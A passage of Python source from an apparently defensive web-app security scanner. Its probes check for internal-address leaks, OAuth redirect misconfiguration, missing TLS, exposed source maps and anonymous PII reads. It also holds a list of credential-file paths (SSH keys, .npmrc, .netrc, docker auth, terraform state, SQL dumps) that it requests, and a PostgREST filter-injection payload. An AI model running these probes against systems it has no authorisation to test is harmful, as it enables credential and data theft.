    reach -- localhost / 127.0.0.1 / 0.0.0.0 / a private RFC1918 IP (the developer's own machine), or
    `https://undefined` / `https://null` (an unset NEXT_PUBLIC_/VITE_ build-time env var stringified into the URL).
    SCORES only when the app is OBSERVED to actually request that host at runtime (its host shows up in the opaque
    tier) -- an OPERATIVE dead data layer, invisible to a "does it load" check. A match that is merely PRESENT in
    the bundle but never requested (a dead `env || localhost` fallback, a CORS/OAuth allowlist entry, a corpus-
    shared template constant like localhost:9999) is UNPROVEN: recorded as an OFF-SCORE diagnostic (report_only),
    never scored -- presence != use. Reads the app's OWN served bundle (ethical). N/A when there is no bundle."""
    blob = _client_bundle(ctx)
    if not blob.strip():
        return None
    private = sorted({m.group(0) for m in _PRIVATE_HOST.finditer(blob)})
    unset = sorted({m.group(0) for m in _UNSET_ENV_HOST.finditer(blob)})
    if not (private or unset):
        ctx.evidence.update(private_backends=[], unset_env_backends=[], scanned_bytes=len(blob))
        return False
    opaque = (ctx.profile.host_tiers or {}).get("opaque_hosts", [])
    operative = _operative_private_hosts(private + unset, opaque)
    if operative:
        ctx.evidence.update(private_backends=private[:5], unset_env_backends=unset[:5],
                            operative_backends=operative[:5], observed=True, source="client-bundle")
        return True                                     # OPERATIVE -> severity escalator `observed` -> 85
    ctx.evidence.update(private_backends=private[:5], unset_env_backends=unset[:5], observed=False,
                        report_only=True, penalty_override=0, source="client-bundle")
    return True                                          # presence-only -> off-score diagnostic (UNPROVEN)


# v2.0 -- INTERNAL-ADDRESS disclosure. A served bundle that hardcodes a genuinely-INTERNAL address (an RFC1918
# private IP, a link-local / cloud-metadata IP, or an internal-only hostname) leaks infrastructure topology to
# every source-viewer -- recon value (SSRF targets, internal hostnames for lateral movement). LOOPBACK is
# deliberately EXCLUDED: localhost / 127.0.0.1 / [::1] / 0.0.0.0 disclose nothing (everyone has one), so this
# scores them at ZERO -- that presence is qa-deploy-001's availability concern, not a disclosure. URL-form + a
# host lookahead (same rigor as _PRIVATE_HOST): the internal TLD must be the FINAL host label, so a PUBLIC host
# carrying the token as a middle label (api.corp.example.com) does NOT match, and a bare "10.0.0.1" in unrelated
# numeric data (no scheme) does NOT match.
_INTERNAL_ADDR = re.compile(
    r"""https?://(?:"""
    r"""10(?:\.\d{1,3}){3}|192\.168(?:\.\d{1,3}){2}|172\.(?:1[6-9]|2\d|3[01])(?:\.\d{1,3}){2}|"""
    r"""169\.254(?:\.\d{1,3}){2}|"""
    r"""[a-z0-9-]+\.(?:internal|corp|intranet|lan))"""
    r"""(?::\d+)?(?=[/"'\s)]|$)""", re.I)


def internal_address_disclosed(ctx, probe) -> bool | None:
    """INFO DISCLOSURE: the served client bundle hardcodes a genuinely-INTERNAL address -- an RFC1918 private IP
    (10 / 172.16-31 / 192.168), a link-local / cloud-metadata IP (169.254), or an internal-only hostname
    (*.internal / *.corp / *.intranet / *.lan). Readable by any source-viewer, it leaks infra topology (recon:
    SSRF targets, internal hostnames). LOOPBACK (localhost / 127.0.0.1 / [::1] / 0.0.0.0) is EXCLUDED -- it
    discloses nothing, so localhost scores zero here (that presence is qa-deploy-001's availability concern, not
    a disclosure). Reads the app's OWN served bundle (ethical). N/A when there is no bundle."""
    blob = _client_bundle(ctx)
    if not blob.strip():
        return None
    addrs = sorted({m.group(0) for m in _INTERNAL_ADDR.finditer(blob)})
    if addrs:
        ctx.evidence.update(internal_addresses=addrs[:5], source="client-bundle")
        return True
    ctx.evidence.update(internal_addresses=[], scanned_bytes=len(blob))
    return False


# v2.0 FAMILY 1 -- OAuth sign-in dead in prod. The app hands the browser an authorization URL whose
# redirect_uri points at localhost / a private IP / an unset env var: after the user authenticates, the
# provider bounces them to a host that does not exist in production, so sign-in is broken for every visitor
# (invisible to a "does the login button render" check). HSTS / mixed-content / unreachable-backend all miss it.
_OAUTH_PROVIDER = re.compile(
    r"accounts\.google\.com/o/oauth2|github\.com/login/oauth/authorize|"
    r"(?:www\.)?facebook\.com/(?:v[\d.]+/)?dialog/oauth|login\.microsoftonline\.com|"
    r"appleid\.apple\.com/auth/authorize|[a-z0-9.-]+\.auth0\.com/authorize|"
    r"[a-z0-9.-]+/oauth2?/(?:v\d/)?authorize|/oauth2?/authorize", re.I)
_OAUTH_URL = re.compile(r"""https?://[^\s"'<>()]+""")
_OAUTH_ROUTES = ("/auth/google", "/auth/github", "/login/google", "/login/github", "/api/auth/signin/google",
                 "/api/auth/signin/github", "/oauth/google", "/oauth/authorize", "/auth/signin", "/.auth/login/google")
_OAUTH_ROUTEHINT = re.compile(r"/(?:auth|oauth|login|signin|sso)(?:/|$|\?)", re.I)
_REDIRECT_PARAM = ("redirect_uri", "redirect_url", "callback_url", "redirecturi")


def _oauth_redirect_uri(url: str) -> str | None:
    """The decoded redirect_uri of an OAuth authorization URL, if `url` looks like one (a known provider host,
    or a redirect_uri alongside client_id / response_type). None otherwise. Unescapes &amp; so an HTML-embedded
    href parses like a raw Location header."""
    parsed = urllib.parse.urlparse(url.replace("&amp;", "&"))
    q = urllib.parse.parse_qs(parsed.query)
    ru = next((q[k][0] for k in _REDIRECT_PARAM if k in q), None)
    if ru and (_OAUTH_PROVIDER.search(url) or "client_id" in q or "response_type" in q):
        return ru
    return None


def oauth_redirect_localhost(ctx, probe) -> bool | None:
    """DEPLOY-TIME "works on my machine" for sign-in: an OAuth authorization URL the app hands the browser sets
    redirect_uri to localhost / a private RFC1918 IP / an unset env var (`https://undefined`). After the user
    authenticates, the provider redirects to a host that does not exist in prod, so sign-in is dead for every
    visitor. Finds the authorization URL in the served homepage or by following a same-origin auth route ONE hop
    (never completing the flow, zero payload). Fires only when the redirect_uri host differs from the app's own
    origin -- a localhost target legitimately using a localhost callback is not punished. N/A when no OAuth flow."""
    origin_netloc = urllib.parse.urlparse(ctx.base_url).netloc.lower()
    budget = probe.probe.get("max_attempts", 30)
    candidates: set[str] = set()
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=False) as c:
        try:
            candidates.update(_OAUTH_URL.findall(c.get(_home_path(ctx, probe)).text))
        except (httpx.HTTPError, httpx.InvalidURL):
            pass
        routes = list(dict.fromkeys(list(_OAUTH_ROUTES)
                                    + [r for r in ctx.profile.routes if _OAUTH_ROUTEHINT.search(r)]))
        for route in routes[:budget]:
            try:
                loc = c.get(route).headers.get("location", "")
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if loc:
                candidates.add(loc)
    found = False
    for url in candidates:
        ru = _oauth_redirect_uri(url)
        if not ru:
            continue
        found = True
        if (_PRIVATE_HOST.search(ru) or _UNSET_ENV_HOST.search(ru)) \
                and urllib.parse.urlparse(ru).netloc.lower() != origin_netloc:
            ctx.evidence.update(oauth_redirect_uri=ru, authorize_url=url[:160], origin=ctx.base_url)
            return True
    return False if found else None


# v2.0 FAMILY 1 -- a PUBLIC origin served over plain http:// with no upgrade to TLS: every visitor's
# credentials and session cookies cross the network in the clear. HSTS (sec-headers-003) and mixed-content
# (sec-mixed-001) both assume https and miss a no-TLS origin entirely. A localhost / private-IP / *.local dev
# or preview target is http by nature, so it is exempt (the "gate to public origins" caveat).
_LOCAL_HOST = re.compile(
    r"^(?:localhost|127\.\d{1,3}\.\d{1,3}\.\d{1,3}|0\.0\.0\.0|\[?::1\]?|"
    r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|"
    r"172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|"
    r"[^.]+\.(?:local|test|localhost))$", re.I)


def _is_local_host(host: str) -> bool:
    return bool(_LOCAL_HOST.match(host or ""))


def _no_tls_decision(base_url: str, status: int | None, location: str) -> bool | None:
    """Verdict from the origin + the homepage response, factored out for testing. None = not applicable (already
    https, or a local/preview host); False = http that upgrades to https (TLS enforced); True = a public origin
    that serves cleartext http with no upgrade."""
    o = urllib.parse.urlparse(base_url)
    if o.scheme != "http" or _is_local_host(o.hostname or ""):
        return None
    if status is None:
        return None
    if 300 <= status < 400:
        # -> https = the origin upgrades (TLS enforced, clean); -> http = redirects but stays cleartext (fires)
        return not (location or "").lower().startswith("https://")
    if 200 <= status < 300:
        return True                          # serves cleartext content over http with no upgrade -> no TLS
    return None   # 401/403/404/429/5xx: a WAF / auth / rate-limit / error / not-found MASKED the real TLS
    #               behavior (e.g. netlify http->https 301 seen as a 403) -> can't assess -> N/A, not a false fire


def no_tls_origin(ctx, probe) -> bool | None:
    """DEPLOY-TIME cleartext transport: a PUBLIC origin reached over plain http:// that does not upgrade to
    https, so credentials / session cookies transit unencrypted. N/A for an https origin (HSTS / mixed-content
    cover those) or a localhost / private-IP / *.local dev target (http is expected there). Clean when the
    http origin redirects to https."""
    o = urllib.parse.urlparse(ctx.base_url)
    if o.scheme != "http" or _is_local_host(o.hostname or ""):
        return None                          # fast path: no network for an https or local/preview target
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=False) as c:
        try:
            r = c.get(_home_path(ctx, probe))
        except (httpx.HTTPError, httpx.InvalidURL):
            return None                      # unreachable -> can't assess
    verdict = _no_tls_decision(ctx.base_url, r.status_code, r.headers.get("location", ""))
    ctx.evidence.update(no_tls=(verdict is True), status=r.status_code, upgrades_to_https=(verdict is False),
                        origin=ctx.base_url)
    return verdict


def vulnerable_dependency(ctx, probe) -> bool | None:
    """Supply-chain: the app SHIPS a client library with a KNOWN CVE (retire.js-style). Reads the app's OWN
    bundle (ETHICAL — their code, never a third party's server) and fingerprints a curated set by license-
    banner version. The team CHOSE the vulnerable dep (24h is enough for `npm audit`), so it's their finding,
    and the report's remediation teaches vendor due diligence by proxy. Precision-first (unambiguous banner +
    established CVE range). N/A when no bundle was served."""
    blob = _client_bundle(ctx)
    if not blob.strip():
        return None
    vulns = depscan.scan_deps(blob)
    if vulns:
        worst = max(v["cvss"] for v in vulns)   # OWASP A03: the finding IS a CVE -> score its own NVD CVSS x 10
        ctx.evidence.update(vulnerable_deps=vulns, count=len(vulns), penalty_override=round(worst * 10))
        return True
    ctx.evidence.update(vulnerable_deps=[], scanned_bytes=len(blob))
    return False


_SOURCEMAP_URL = re.compile(r"//[#@]\s*sourceMappingURL=(\S+)")


# A .map that reconstructs only VENDORED source (React, Next's polyfills, axios) is not a disclosure: that code
# is already public on npm and carries none of the app's business logic or secrets. In the v18 corpus 114 of 164
# fires (69%) were exactly this -- 104 the identical Next.js chunk `a6dad97d9634a72d.js.map` (one source, a
# node_modules polyfill) and 10 the base44 platform `badge.js` widget (one app file, `src/badge/badge.ts`). The
# finding must key on the app's OWN source, so exclude vendored paths and require >= 2 app-authored code files.
_VENDOR_SOURCE = ("node_modules/", "/webpack/runtime/", "webpack://webpack/", "/dist/build/polyfills/")
_SOURCE_CODE_EXT = (".js", ".jsx", ".ts", ".tsx", ".mjs", ".cjs", ".vue", ".svelte", ".coffee")
_MIN_APP_SOURCES = 2   # the badge widget exposes exactly 1 app file; the smallest real leak in v18 exposed 3


def _app_source_files(sources) -> list[str]:
    """The app-authored CODE files in a sourcemap's `sources`: not under node_modules / a bundler runtime /
    a framework polyfill, and an actual source extension (a .png/.css asset is not a business-logic leak)."""
    out = []
    for s in sources or []:
        if not isinstance(s, str):
            continue
        low = s.lower()
        if any(v in low for v in _VENDOR_SOURCE):
            continue
        if low.rsplit("?", 1)[0].endswith(_SOURCE_CODE_EXT):
            out.append(s)
    return out


def source_map_exposed(ctx, probe) -> bool | None:
    """SPA-native info-disclosure: a production bundle ships its .map, so anyone can reconstruct the ORIGINAL
    source — business logic, hidden endpoints, and (the real risk) hardcoded secrets a minified scan misses.
    For each same-origin .js bundle, fetch the //# sourceMappingURL target (or the conventional <bundle>.map);
    fire only on a REAL sourcemap (JSON with sources/sourcesContent) that reconstructs the APP's OWN source, never
    a soft-404 shell or a purely-vendored map (React/Next/a platform widget). N/A when there are no .js bundles."""
    js = [r for r in (["/"] + ctx.profile.routes) if r.split("?")[0].endswith(".js")]
    if not js:
        return None
    for path in list(dict.fromkeys(js))[:10]:
        try:
            m = _SOURCEMAP_URL.search(ctx.client.get(path).text)
        except (httpx.HTTPError, httpx.InvalidURL):
            continue
        cand = m.group(1) if m else None
        for mp in [c for c in (cand, path + ".map") if c and not c.startswith(("http", "data:"))]:
            try:
                r = ctx.client.get(urllib.parse.urljoin(path, mp))
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if r.status_code != 200 or _is_phantom_shell(ctx, r):
                continue                      # not served, or a soft-404 shell
            try:
                sm = r.json()
            except ValueError:
                continue
            if not (isinstance(sm, dict) and sm.get("version") and ("sources" in sm or "sourcesContent" in sm)):
                continue
            app = _app_source_files(sm.get("sources"))
            if len(app) < _MIN_APP_SOURCES:
                continue                      # vendored-only (React/Next) or a platform widget -> not app source
            ctx.evidence.update(bundle=path, source_map=mp, sources=len(sm.get("sources") or []),
                                app_sources=len(app), app_source_sample=app[:6],
                                reconstructable=bool(sm.get("sourcesContent")))
            return True
    return False


def _postgrest_tables(resp) -> list[str]:
    """Table names PostgREST advertises at its root for the anon role (the OpenAPI 'definitions')."""
    try:
        j = resp.json()
    except ValueError:
        return []
    if isinstance(j, dict) and isinstance(j.get("definitions"), dict):
        return list(j["definitions"].keys())
    if isinstance(j, dict) and isinstance(j.get("paths"), dict):
        return [p.strip("/") for p in j["paths"] if p.strip("/")]
    return []


def _supabase_tables(blob: str, observed: list[str] | None = None) -> list[str]:
    """Candidate tables to probe, strongest signal first: tables the app was OBSERVED reading at runtime
    (profile.backend_tables — survives minification and dynamically-built queries, which is exactly what a
    bundle scan loses), then names mined from its code (supabase-js `.from('t')`, hardcoded `/rest/v1/t`
    literals), then a common fallback. Bundle+observation-driven because the anon key can no longer
    enumerate the PostgREST OpenAPI root — and enumeration by guesswork was refuted."""
    mined = list(dict.fromkeys(list(observed or [])
                               + [m.group(1) for m in _SUPABASE_FROM.finditer(blob)]
                               + [m.group(1) for m in _SUPABASE_REST.finditer(blob)]))
    return (mined + [t for t in _SUPABASE_COMMON if t not in mined])[:16]


def _observed_tables(ctx) -> list[str]:
    """Managed-backend tables the app itself read at runtime (discovery records them from observed traffic);
    empty without a browser render, in which case the probes fall back to bundle mining alone."""
    return list(getattr(getattr(ctx, "profile", None), "backend_tables", None) or [])


# ---- sec-exposure-007: sensitive files the .env/.git list misses -------------------------------------------
# Each path is paired with a CONTENT check, never "200 = finding": a catch-all host answers 200 for every path
# (the same reason response_is_dotenv rejects an HTML shell), and a config.json is often legitimately public.
# The body is the evidence. Measured on GapBench: config-leak serves config.json, terraform-state-leak serves
# terraform.tfstate, docker-config-leak serves registry auth — we only ever checked .env/.git/.aws, so 8 of 10
# probes applied and the app still read CLEAN. Guessing the wrong filename is indistinguishable from safety.
_HTML_OPEN = ("<!doctype", "<html")


def _not_html(resp) -> bool:
    return (resp.status_code == 200 and "html" not in resp.headers.get("content-type", "").lower()
            and not resp.text.lstrip()[:20].lower().startswith(_HTML_OPEN))


def _f_terraform(resp) -> bool:
    return _not_html(resp) and '"terraform_version"' in resp.text and '"resources"' in resp.text


def _f_sql_dump(resp) -> bool:
    return _not_html(resp) and bool(re.search(
        r"CREATE TABLE|INSERT INTO|--\s*(?:MySQL|PostgreSQL|MariaDB)\b.*dump", resp.text[:20000], re.I))


def _f_docker_auth(resp) -> bool:
    return _not_html(resp) and '"auths"' in resp.text and '"auth"' in resp.text


def _f_npmrc(resp) -> bool:
    return _not_html(resp) and bool(re.search(r"_authToken\s*=|:_auth\s*=", resp.text[:8000]))


def _f_netrc(resp) -> bool:
    t = resp.text[:8000]
    return _not_html(resp) and "machine" in t and "password" in t


def _f_private_key(resp) -> bool:
    return _not_html(resp) and bool(re.search(r"-----BEGIN [A-Z ]*PRIVATE KEY-----", resp.text[:8000]))


def _f_config_secret(resp) -> bool:
    """A config file is only a FINDING when it actually carries a secret. A public frontend config (api base
    urls, feature flags, a publishable key) is normal and must not fire — so this defers to the same
    secret-shape detector the source scan uses rather than treating the file's existence as the flaw."""
    if not _not_html(resp):
        return False
    from . import secretscan
    return bool(secretscan.scan_blob(resp.text[:200000]))


_SENSITIVE_FILES = (
    ("/terraform.tfstate", _f_terraform), ("/terraform.tfstate.backup", _f_terraform),
    ("/backup.sql", _f_sql_dump), ("/dump.sql", _f_sql_dump), ("/db.sql", _f_sql_dump),
    ("/database.sql", _f_sql_dump), ("/backup/db.sql", _f_sql_dump),
    ("/.dockercfg", _f_docker_auth), ("/.docker/config.json", _f_docker_auth),
    ("/.npmrc", _f_npmrc), ("/.netrc", _f_netrc),
    ("/id_rsa", _f_private_key), ("/.ssh/id_rsa", _f_private_key), ("/private.key", _f_private_key),
    ("/config.json", _f_config_secret), ("/config.js", _f_config_secret),
    ("/static/config.js", _f_config_secret), ("/app/config.json", _f_config_secret),
)


def _claimed_by_a_routes_probe(resp) -> bool:
    """Would a routes-scanning probe already report THIS body? sec-secrets-001 fires on a provider secret,
    sec-exposure-005 on credential material. Used to dedup by content instead of by path."""
    with contextlib.suppress(Exception):
        return bool(response_leaks_secret(resp) or response_leaks_credentials(resp))
    return False


def exposed_sensitive_file(ctx, probe) -> bool | None:
    """A sensitive file served to an anonymous visitor, beyond the .env/.git/.aws trio: terraform state, a SQL
    dump, docker registry auth, an npm/netrc credential, a private key, or a config carrying a real secret.

    Fires on the FIRST path whose body proves it, so a repo that leaks three files is one finding. Paths are
    resolved under the app root (_at), because a sub-path deployment's files live there and not at the origin.
    N/A when nothing matched AND nothing was even reachable, so a host that refused every request isn't scored
    as clean."""
    # Dedup is CONTENT-based, not path-based. Skipping every path discovery happened to list was backwards:
    # measured on the repro, the SAME bytes on the SAME server flipped True -> False purely because the crawl
    # named the file, so an app whose sitemap exposes /.docker/config.json got a free pass while one that hid
    # it got caught. What must not be double-billed is a leak another probe ALREADY reports, which is a fact
    # about the BODY: sec-secrets-001 claims it when a provider secret is in there (that is the /config.js
    # case that moved the anchor 664 -> 673) and sec-exposure-005 claims it when the body carries credential
    # material. Absent both, no other probe fires on this file and skipping it just loses the finding.
    known = {(r or "").split("?")[0].rstrip("/") for r in getattr(ctx.profile, "routes", None) or []}
    seen = [False]   # monotonic False->True 'any path was reachable' flag; safe under the pool (idempotent set)
    with make_client(ctx.base_url, ctx.headers, timeout=8.0, follow_redirects=True) as c:
        # INDEPENDENT candidate GETs with a CONTENT oracle -> fan out (lower pool: this scan is the #1 per-origin
        # challenge trigger) and stop on the FIRST proven file, so a repo leaking three files is still one finding.
        def _send(spec):
            path, check = spec
            try:
                r = c.get(_at(ctx, path))
            except (httpx.HTTPError, httpx.InvalidURL):
                return spec, None
            seen[0] = True
            if _is_phantom_shell(ctx, r):
                return spec, None          # catch-all host echoing its shell -> not a served file
            if path.rstrip("/") in known and _claimed_by_a_routes_probe(r):
                return spec, None          # a discovered path another probe already bills -> theirs, not ours
            with contextlib.suppress(Exception):
                if check(r):
                    return spec, r
            return spec, None
        got = _fan_out_first(_send, _SENSITIVE_FILES, lambda s, r: r is not None, pool=_EXPOSURE_POOL)
        if got is not None:
            path, r = got[0][0], got[1]
            ctx.evidence.update(exposed=True, high_privilege=True, path=path, status=r.status_code,
                                bytes=len(r.content or b""),
                                repro=_repro("GET", str(r.url), status=r.status_code, matched=f"served {path}"))
            return True
    if not seen[0]:
        ctx.evidence["na_reason"] = "no candidate path was reachable (host refused every request)"
        return None
    ctx.evidence.update(exposed=False, paths_checked=len(_SENSITIVE_FILES))
    return False


# FILTER INJECTION (CWE-943) — the BaaS-era analogue of SQLi: user input concatenated into a data-store filter
# expression instead of passed as a parameter. Measured on supavulnbase's {basePath}/api/projects/search:
#   q=Build        -> 200 {"count":0}
#   q=Build,other  -> 400 {"error":"failed to parse logic tree
#                          ((title.ilike.%Build,other%,tagline.ilike.%Build,other%))"}
#   q=*            -> 200 {"count":7}    every row, because * lands inside the ilike pattern
#
# The signature is the app's OWN filter template. Our payload is a comma and a benign token, so a response
# containing `title.ilike.%` cannot be a reflection of it — the same rule that makes sec-lfi-001 precise by
# matching /etc/passwd's root line rather than the path we asked for.
_FILTER_GRAMMAR = re.compile(
    r"failed to parse logic tree"
    r"|unexpected .{0,24}expecting"
    # a PostgREST/Supabase filter operator applied to a value: title.ilike.%x%, id.eq.3, or(...), and(...)
    r"|\b[A-Za-z_][A-Za-z0-9_]{0,40}\.(?:ilike|like|eq|neq|gte|lte|gt|lt|in|fts|plfts|cs|cd|is|not)\."
    r"|\b(?:or|and)\([A-Za-z_]",
    re.I)
_FILTER_PAYLOAD = ",hlfi"          # a comma is what breaks a PostgREST logic tree
_FILTER_BENIGN = "hlfiprobe"
_FILTER_TARGET_CAP = 12


def _filter_targets(profile):
    """(path, param) pairs worth testing: any GET endpoint carrying a query parameter. Search endpoints come
    first because a search box is where user input reaches a filter."""
    out = []
    for e in profile.endpoints or []:
        if (e.method or "get").lower() != "get":
            continue
        for p in e.query_params or []:
            out.append((e.path, p, (e.kind or "") == "search"))
    out.sort(key=lambda t: not t[2])         # search endpoints first
    return [(path, param) for path, param, _s in out][:_FILTER_TARGET_CAP]


def filter_injection(ctx, probe) -> bool | None:
    """User input reaching a data-store FILTER expression. Fires when a benign baseline comes back clean and a
    payload carrying a filter metacharacter provokes the store's own filter grammar in the response.
    N/A when there is no GET endpoint with a query parameter to inject into."""
    targets = _filter_targets(ctx.profile)
    if not targets:
        ctx.evidence["na_reason"] = "no GET endpoint with a query parameter to inject a filter into"
        return None
    tested = 0
    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as c:
        for path, param in targets:
            try:
                base = c.get(path, params={param: _FILTER_BENIGN})
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if _FILTER_GRAMMAR.search(base.text or ""):
                continue      # this app answers with filter grammar even when nothing is wrong -> no signal
            tested += 1
            try:
                r = c.get(path, params={param: _FILTER_BENIGN + _FILTER_PAYLOAD})
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            m = _FILTER_GRAMMAR.search(r.text or "")
            if not m:
                continue
            ev = {"injectable": True, "endpoint": path, "param": param, "matched": m.group(0)[:60],
                  "repro": _repro_from_resp(
                      r, matched="filter grammar disclosed by a metacharacter: " + m.group(0)[:48])}
            with contextlib.suppress(Exception):   # corroboration only, never the trigger
                wide = c.get(path, params={param: "*"})
                ev["wildcard_rows"] = len(_json_objects(wide) or [])
                ev["baseline_rows"] = len(_json_objects(base) or [])
            ctx.evidence.update(**ev)
            return True
    if not tested:
        ctx.evidence["na_reason"] = "no query parameter answered a clean baseline to compare against"
        return None
    ctx.evidence.update(injectable=False, params_tested=tested)
    return False


# ANONYMOUS BULK DATA. Measured on supavulnbase: an unauthenticated GET of {basePath}/api/admin/export returns
# 6 sponsor_leads (contact_email, amount_cents, notes), 4 payout_accounts (account_last4, routing_hint) and 108
# profiles. The instructive part is that payout_accounts is that fixture's OWN control for correct owner-scoped
# RLS: the database policy is right and this route hands the data out regardless, presumably with a privileged
# key. No amount of RLS testing finds it, because the flaw sits ABOVE the policy — which is why this is its own
# probe rather than a widening of sec-backend-001.
#
# The gate is COLUMN SENSITIVITY, never the path: a product catalog, a blog index and a public profile list all
# return bulk records and none is a leak. On the same fixture `profiles` (username/display_name/bio) is a
# declared control and must stay silent while sponsor_leads and payout_accounts fire, and the existing
# _SENSITIVE_COLUMN gate does exactly that with no tuning.
_ANON_BULK_MIN_RECORDS = 3     # one record is /api/me, not a dump
_ANON_BULK_ENDPOINT_CAP = 25


def _record_collections(resp):
    """Every list-of-objects this JSON response carries, top level or one key deep. An export route nests
    several collections in one object ({"sponsor_leads":[...], "payout_accounts":[...]}), and reading only the
    top level would miss all of them."""
    if "json" not in (resp.headers.get("content-type") or "").lower():
        return []
    try:
        doc = resp.json()
    except Exception:
        return []
    out = []
    if isinstance(doc, list):
        out.append(("", [o for o in doc if isinstance(o, dict)]))
    elif isinstance(doc, dict):
        for key, val in doc.items():
            if isinstance(val, list):
                out.append((str(key), [o for o in val if isinstance(o, dict)]))
    return [(k, rows) for k, rows in out if rows]


_ANON_BULK_VALUE_SAMPLE = 25   # rows to sample for value-type + variance checks (JSON collections are homogeneous)

# A curated listing of PUBLIC entities (places / orgs / resources) returns bulk records with an address, a phone
# or an org email, and that is not a personal-data leak: those contacts are meant to be published. The tell is a
# place/listing column (a Google Places id, a scrape `dataSource`, opening `hours`, a `category`) AND the ABSENCE
# of any per-user ownership column. If a row is owned by a user (uid / created_by / candidate / patient /
# submitted_by ...), it is user data whatever else it carries, so an ownership column VETOES the directory verdict.
_DIRECTORY_MARKERS = {"googleplaceid", "googlemapsurl", "mapsurl", "placeid", "datasource", "website", "hours",
                      "openinghours", "category", "categories", "rating", "googlerating", "verified",
                      "departments", "services", "eligibility", "amenities", "cuisine"}
_OWNERSHIP_MARKERS = {"uid", "userid", "owner", "ownerid", "createdby", "createdbyid", "account", "accountid",
                      "customer", "customerid", "candidate", "candidateid", "patient", "patientid", "submittedby",
                      "submittedbyuid", "submittedbyid", "author", "authorid", "member", "memberid"}


def _norm_col(c: str) -> str:
    return re.sub(r"[^a-z0-9]", "", c.lower())


def _is_public_directory(cols: list[str]) -> bool:
    """True when the collection reads as a published listing of public entities, not a dump of user records: a
    directory-marker column is present and NO per-user ownership column is (ownership vetoes -> it is user data)."""
    norm = {_norm_col(c) for c in cols}
    if norm & _OWNERSHIP_MARKERS:
        return False
    return bool(norm & _DIRECTORY_MARKERS)


def _values_match_sensitive_type(col: str, vals: list) -> bool:
    """The column NAME matched `_SENSITIVE_COLUMN`; confirm at least one VALUE is actually of that type. A column
    merely NAMED like PII is not a leak: `tokens_total` holds LLM token COUNTS (ints), `phones` holds ARPAbet
    phonemes (['Y','AE1']), `phone_bedtime_habit` holds a survey enum. Value-level is provable; name-level is a
    guess -- and the whole probe bills 40 points, so it must key on the evidence, not the label."""
    c = col.lower()
    scalars = [v for v in vals if isinstance(v, (str, int, float)) and not isinstance(v, bool)]
    if not scalars:
        return False        # values are lists / dicts / bools / null -> not a scalar identifier (phones=['Y','AE1'])
    strs = [str(v) for v in scalars]
    if "email" in c or "mail" in c:
        return any("@" in s and "." in s.split("@")[-1] for s in strs)
    if re.search(r"ssn|social", c):
        return any(sum(ch.isdigit() for ch in s) == 9 for s in strs)
    if "credit" in c or "card" in c:
        return any(13 <= sum(ch.isdigit() for ch in s) <= 19 for s in strs)
    if "phone" in c:
        def _phoneish(s: str) -> bool:
            digits = sum(ch.isdigit() for ch in s)
            body = re.sub(r"[\s()+.-]", "", s)          # a real number is mostly digits after formatting chars
            return 7 <= digits <= 15 and digits >= len(body) - 1
        return any(_phoneish(s) for s in strs)
    if "token" in c or "secret" in c or "key" in c or "stripe" in c:
        # an opaque credential (a JWT, an sk_live_..., a UUID), not a counter: a mixed-alnum string >= 12 chars,
        # never a plain integer -- this is what separates `access_token` from `tokens_total`
        return any(isinstance(v, str) and len(v) >= 12 and any(ch.isdigit() for ch in v)
                   and any(ch.isalpha() for ch in v) for v in scalars)
    if "dob" in c or "birth" in c:
        return any(sum(ch.isdigit() for ch in s) >= 4 and any(sep in s for sep in "-/.") for s in strs)
    # name / address / password: type-validation is weak (any string looks valid), so accept a non-empty string
    # here and let `_is_public_directory` handle the public-address / public-org-contact case.
    return any(isinstance(v, str) and v.strip() for v in scalars)


def anon_bulk_data_exposed(ctx, probe) -> bool | None:
    """An ANONYMOUS request returning bulk records with PII / financial / credential columns.

    Deliberately sends NO session — not the probes' own, and not a caller-supplied --header identity — because
    the claim is precisely that a stranger can read this. N/A when there is no JSON collection anywhere to
    judge, so an app with no such surface is not scored as clean."""
    paths = [e.path for e in ctx.profile.endpoints if (e.method or "get").lower() == "get"]
    paths += [r for r in (ctx.profile.routes or []) if "/api/" in (r or "") and not r.endswith(".js")]
    paths = list(dict.fromkeys(p for p in paths if p))[:_ANON_BULK_ENDPOINT_CAP]
    if not paths:
        ctx.evidence["na_reason"] = "no API-ish GET route to read anonymously"
        return None
    judged = False
    with make_client(ctx.base_url, None, timeout=10.0, follow_redirects=True) as anon:
        for path in paths:
            try:
                r = anon.get(path)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if r.status_code in (401, 403):
                judged = True     # the app REFUSED a stranger: that is a definitive clean answer, not an
                continue          # untested one, and calling it N/A would flag a well-built app as unassessed
            if r.status_code != 200:
                continue          # 404/5xx: nothing there to judge
            collections = _record_collections(r)
            if not collections:
                continue
            judged = True
            if response_leaks_credentials(r):
                continue          # sec-exposure-005 already reports this body -> one leak, one finding
            for key, rows in collections:
                if len(rows) < _ANON_BULK_MIN_RECORDS:
                    continue
                sample = rows[:_ANON_BULK_VALUE_SAMPLE]
                cols = sorted({c for row in sample for c in row})
                if _is_public_directory(cols):
                    continue      # a published listing of public places/orgs, not a dump of personal records
                hits = []
                for c in cols:
                    if not _SENSITIVE_COLUMN.search(c):
                        continue
                    vals = [row[c] for row in sample if row.get(c) not in (None, "")]
                    if not _values_match_sensitive_type(c, vals):
                        continue  # named like PII, but the values are not (tokens_total=ints, phones=phonemes)
                    if len({str(v).strip().lower() for v in vals}) < 2:
                        continue  # one value shared across every row = a config / org contact, not per-user data
                    hits.append(c)
                if not hits:
                    continue      # bulk but not sensitive: a catalog, an index, a public profile list
                ctx.evidence.update(anon_readable=True, sensitive_fields=True, bulk_read=True, endpoint=path, collection=key or "(top level)",
                                    records=len(rows), sensitive_columns=hits[:6], columns=cols[:10],
                                    repro=_repro_from_resp(
                                        r, matched="%d records with %s readable to an anonymous request"
                                                   % (len(rows), ", ".join(hits[:3]))))
                return True
    if not judged:
        ctx.evidence["na_reason"] = "no anonymous route returned a JSON collection to judge"
        return None
    ctx.evidence.update(anon_readable=False, endpoints_checked=len(paths))
    return False


